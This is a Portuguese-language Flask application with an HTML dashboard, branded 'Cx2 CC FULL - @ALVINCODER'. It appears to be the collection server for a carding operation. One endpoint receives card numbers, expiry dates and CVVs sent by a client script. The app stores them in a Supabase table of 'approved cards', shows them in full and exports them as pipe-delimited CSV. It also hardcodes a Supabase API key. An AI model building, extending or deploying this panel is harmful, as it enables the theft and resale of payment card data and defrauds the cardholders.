import os
import requests
from flask import Flask, jsonify, render_template_string, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Configurações do Supabase
SUPABASE_URL = "https://huzacnpyzypruilvrhlg.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh1emFjbnB5enlwcnVpbHZyaGxnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTI1MzM0NjgsImV4cCI6MjA2ODEwOTQ2OH0.XTzgMlH7UMDniUZ1VgpAKyiwaEQuf7jvfa0P7gSwRC0"

def salvar_cartao_supabase(numero, mes, ano, cvv):
    """Salva cartão no Supabase"""
    try:
        # Dados para inserir (incluindo CVV)
        dados_insert = {
            "numero_cartao": numero,
            "mes": mes,
            "ano": ano,
            "cvv": cvv
        }
        
        # Headers para Supabase
        headers = {
            'apikey': SUPABASE_KEY,
            'Authorization': f'Bearer {SUPABASE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal'
        }
        
        url = f"{SUPABASE_URL}/rest/v1/cartoes_aprovados"
        response = requests.post(url, json=dados_insert, headers=headers, timeout=10)
        
        if response.status_code == 201:
            return True, "Cartão salvo com sucesso"
        else:
            print(f"Erro ao salvar: {response.status_code} - {response.text}")
            return False, f"Erro ao salvar no Supabase: {response.status_code}"
            
    except Exception as e:
        print(f"Erro ao salvar cartão: {str(e)}")
        return False, f"Erro interno: {str(e)}"

def buscar_cartoes():
    """Busca cartões do Supabase"""
    try:
        headers = {
            'apikey': SUPABASE_KEY,
            'Authorization': f'Bearer {SUPABASE_KEY}',
            'Content-Type': 'application/json'
        }
        
        url = f"{SUPABASE_URL}/rest/v1/cartoes_aprovados?select=*&order=id.desc"
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Erro ao buscar: {response.status_code} - {response.text}")
            return []
            
    except Exception as e:
        print(f"Erro ao buscar cartões: {str(e)}")
        return []

@app.route('/api/limpar-cartoes', methods=['DELETE'])
def limpar_cartoes():
    """Endpoint para deletar todos os cartões"""
    try:
        headers = {
            'apikey': SUPABASE_KEY,
            'Authorization': f'Bearer {SUPABASE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal'
        }
        
        # Deletar todos os registros da tabela usando filtro que pega todos
        # No Supabase, precisamos usar um filtro para deletar
        url = f"{SUPABASE_URL}/rest/v1/cartoes_aprovados?id=gte.0"
        response = requests.delete(url, headers=headers, timeout=10)
        
        if response.status_code in [200, 204]:
            return jsonify({"message": "Todos os cartões foram removidos com sucesso"}), 200
        else:
            print(f"Erro ao deletar: {response.status_code} - {response.text}")
            return jsonify({"error": f"Erro ao deletar cartões: {response.status_code}"}), 500
            
    except Exception as e:
        print(f"Erro ao deletar cartões: {str(e)}")
        return jsonify({"error": f"Erro interno do servidor: {str(e)}"}), 500

@app.route('/')
def dashboard():
    """Dashboard principal"""
    return render_template_string('''
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cx2 CC FULL - @ALVINCODER</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .status-online {
            background: #27ae60;
            box-shadow: 0 0 10px rgba(39, 174, 96, 0.5);
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 30px;
            padding: 30px;
            background: #f8f9fa;
        }
        
        .stat-card {
            background: white;
            padding: 25px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            border-left: 4px solid #3498db;
        }
        
        .stat-card h3 {
            font-size: 2.5em;
            color: #2c3e50;
            margin-bottom: 10px;
        }
        
        .stat-card p {
            color: #7f8c8d;
            font-size: 1.1em;
        }
        
        .controls {
            display: flex;
            gap: 15px;
            padding: 20px 30px;
            background: #ecf0f1;
            flex-wrap: wrap;
            align-items: center;
        }
        
        .search-box {
            flex: 1;
            min-width: 250px;
        }
        
        .search-box input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #bdc3c7;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .search-box input:focus {
            outline: none;
            border-color: #3498db;
        }
        
        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn-primary {
            background: #3498db;
            color: white;
        }
        
        .btn-primary:hover {
            background: #2980b9;
            transform: translateY(-2px);
        }
        
        .btn-success {
            background: #27ae60;
            color: white;
        }
        
        .btn-success:hover {
            background: #229954;
        }
        
        .btn-danger {
            background: #e74c3c;
            color: white;
        }
        
        .btn-danger:hover {
            background: #c0392b;
            transform: translateY(-2px);
        }
        
        .table-container {
            padding: 0 30px 30px;
            overflow-x: auto;
        }
        
        .table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
        }
        
        .table th {
            background: #34495e;
            color: white;
            padding: 15px;
            text-align: left;
            font-weight: 600;
        }
        
        .table td {
            padding: 15px;
            border-bottom: 1px solid #ecf0f1;
        }
        
        .table tr:hover {
            background: #f8f9fa;
        }
        
        .cartao {
            font-family: 'Courier New', monospace;
            background: #f1f2f6;
            padding: 5px 8px;
            border-radius: 4px;
            font-size: 14px;
        }
        
        .loading {
            text-align: center;
            padding: 50px;
            color: #7f8c8d;
        }
        
        .empty-state {
            text-align: center;
            padding: 50px;
            color: #7f8c8d;
        }
        
        .empty-state h3 {
            margin-bottom: 15px;
            font-size: 1.5em;
        }
        
        @media (max-width: 768px) {
            .container {
                margin: 10px;
                border-radius: 10px;
            }
            
            .header {
                padding: 20px;
            }
            
            .header h1 {
                font-size: 1.8em;
            }
            
            .stats {
                grid-template-columns: 1fr;
                gap: 20px;
                padding: 20px;
            }
            
            .controls {
                flex-direction: column;
                align-items: stretch;
            }
            
            .search-box {
                max-width: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 Dashboard Cartões Aprovados</h1>
            <p><span class="status-indicator status-online"></span>Conectado ao Supabase</p>
        </div>
        
        <div class="stats" id="stats">
            <div class="stat-card">
                <h3 id="total-cartoes">-</h3>
                <p>Total de Cartões</p>
            </div>
            <div class="stat-card">
                <h3 id="cartoes-hoje">-</h3>
                <p>Cartões Hoje</p>
            </div>
            <div class="stat-card">
                <h3 id="ultimo-cartao">-</h3>
                <p>Último Cartão</p>
            </div>
        </div>
        
        <div class="controls">
            <div class="search-box">
                <input type="text" id="search" placeholder="🔍 Buscar por número do cartão...">
            </div>
            <button class="btn btn-primary" onclick="carregarCartoes()">🔄 Atualizar</button>
            <button class="btn btn-success" onclick="exportarCSV()">📊 Exportar CSV</button>
            <button class="btn btn-danger" onclick="limparCartoes()">🗑️ Limpar Todos</button>
        </div>
        
        <div class="table-container">
            <div id="loading" class="loading">
                <h3>🔄 Carregando cartões...</h3>
            </div>
            
            <div id="empty-state" class="empty-state" style="display: none;">
                <h3>📭 Nenhum cartão encontrado</h3>
                <p>Os cartões aprovados aparecerão aqui quando seus clientes executarem o script.</p>
            </div>
            
                <table class="table" id="cartoes-table" style="display: none;">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Número do Cartão</th>
                        <th>Mês</th>
                        <th>Ano</th>
                        <th>CVV</th>
                        <th>Cartão Formatado</th>
                    </tr>
                </thead>
                <tbody id="cartoes-tbody">
                </tbody>
            </table>
        </div>
    </div>

    <script>
        let cartoes = [];
        let cartoesOriginais = [];

        async function carregarCartoes() {
            try {
                const response = await fetch('/api/cartoes');
                const data = await response.json();
                
                cartoes = data;
                cartoesOriginais = [...data];
                
                atualizarEstatisticas();
                renderizarTabela();
                
            } catch (error) {
                console.error('Erro ao carregar cartões:', error);
                document.getElementById('loading').innerHTML = '<h3>❌ Erro ao carregar cartões</h3>';
            }
        }

        function atualizarEstatisticas() {
            const hoje = new Date().toDateString();
            const cartoesHoje = cartoes.filter(cartao => {
                const dataCartao = new Date(cartao.created_at).toDateString();
                return dataCartao === hoje;
            });

            document.getElementById('total-cartoes').textContent = cartoes.length;
            document.getElementById('cartoes-hoje').textContent = cartoesHoje.length;
            
            if (cartoes.length > 0) {
                const ultimoCartao = cartoes[0].numero_cartao;
                document.getElementById('ultimo-cartao').textContent = 
                    ultimoCartao.slice(0, 4) + '****';
            } else {
                document.getElementById('ultimo-cartao').textContent = '-';
            }
        }

        function renderizarTabela() {
            const loading = document.getElementById('loading');
            const emptyState = document.getElementById('empty-state');
            const table = document.getElementById('cartoes-table');
            const tbody = document.getElementById('cartoes-tbody');

            loading.style.display = 'none';

            if (cartoes.length === 0) {
                table.style.display = 'none';
                emptyState.style.display = 'block';
                return;
            }
            
            table.style.display = 'table';
            emptyState.style.display = 'none';
            
            tbody.innerHTML = cartoes.map(cartao => `
                <tr>
                    <td>${cartao.id}</td>
                    <td class="cartao">${cartao.numero_cartao}</td>
                    <td>${cartao.mes}</td>
                    <td>${cartao.ano}</td>
                    <td class="cartao">${cartao.cvv || '***'}</td>
                    <td class="cartao">${cartao.numero_cartao}|${cartao.mes}|${cartao.ano}|${cartao.cvv || '***'}</td>
                </tr>
            `).join('');
        }

        function filtrarCartoes() {
            const termo = document.getElementById('search').value.toLowerCase();
            
            if (!termo) {
                cartoes = [...cartoesOriginais];
            } else {
                cartoes = cartoesOriginais.filter(cartao => 
                    cartao.numero_cartao.toLowerCase().includes(termo)
                );
            }
            
            atualizarEstatisticas();
            renderizarTabela();
        }

        function exportarCSV() {
            if (cartoes.length === 0) {
                alert('Nenhum cartão para exportar!');
                return;
            }
            
            const headers = ['ID', 'Numero_Cartao', 'Mes', 'Ano', 'CVV', 'Cartao_Formatado'];
            const csvContent = [
                headers.join(','),
                ...cartoes.map(cartao => [
                    cartao.id,
                    cartao.numero_cartao,
                    cartao.mes,
                    cartao.ano,
                    cartao.cvv || '***',
                    `${cartao.numero_cartao}|${cartao.mes}|${cartao.ano}|${cartao.cvv || '***'}`
                ].join(','))
            ].join('\\n');
            
            const blob = new Blob([csvContent], { type: 'text/csv' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cartoes_aprovados_${new Date().toISOString().split('T')[0]}.csv`;
            a.click();
            window.URL.revokeObjectURL(url);
        }

        function limparCartoes() {
            if (!confirm('⚠️ ATENÇÃO: Isso irá deletar TODOS os cartões salvos permanentemente. Tem certeza?')) {
                return;
            }
            
            if (!confirm('🚨 ÚLTIMA CONFIRMAÇÃO: Todos os cartões serão removidos do banco de dados. Continuar?')) {
                return;
            }
            
            fetch('/api/limpar-cartoes', {
                method: 'DELETE',
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                if (data.message) {
                    alert('✅ Todos os cartões foram removidos com sucesso!');
                    carregarCartoes(); // Recarregar a lista
                } else {
                    alert('❌ Erro ao remover cartões: ' + (data.error || 'Erro desconhecido'));
                }
            })
            .catch(error => {
                console.error('Erro:', error);
                alert('❌ Erro de conexão ao tentar remover cartões');
            });
        }

        // Event listeners
        document.getElementById('search').addEventListener('input', filtrarCartoes);

        // Auto-refresh a cada 10 segundos
        setInterval(carregarCartoes, 10000);

        // Carregar dados iniciais
        carregarCartoes();
    </script>
</body>
</html>
    ''')

@app.route('/api/receber-cartao', methods=['POST'])
def receber_cartao():
    """Endpoint para receber cartões dos clientes"""
    try:
        data = request.get_json()
        
        if not data or 'cartao' not in data:
            return jsonify({"error": "Dados inválidos"}), 400
        
        cartao = data['cartao']
        
        # Parse do cartão (formato: numero|mes|ano|cvv)
        partes = cartao.split('|')
        if len(partes) != 4:
            return jsonify({"error": "Formato de cartão inválido"}), 400
        
        numero, mes, ano, cvv = partes
        
        # Salvar no Supabase
        sucesso, mensagem = salvar_cartao_supabase(numero, mes, ano, cvv)
        
        if sucesso:
            return jsonify({"message": mensagem}), 201
        else:
            return jsonify({"error": mensagem}), 500
            
    except Exception as e:
        print(f"Erro no endpoint receber_cartao: {str(e)}")
        return jsonify({"error": "Erro interno do servidor"}), 500

@app.route('/api/cartoes', methods=['GET'])
def listar_cartoes():
    """Endpoint para listar cartões"""
    try:
        cartoes = buscar_cartoes()
        return jsonify(cartoes), 200
    except Exception as e:
        print(f"Erro ao listar cartões: {str(e)}")
        return jsonify({"error": "Erro interno do servidor"}), 500

# Para Vercel, precisamos exportar a aplicação
if __name__ == '__main__':
    app.run(debug=True)

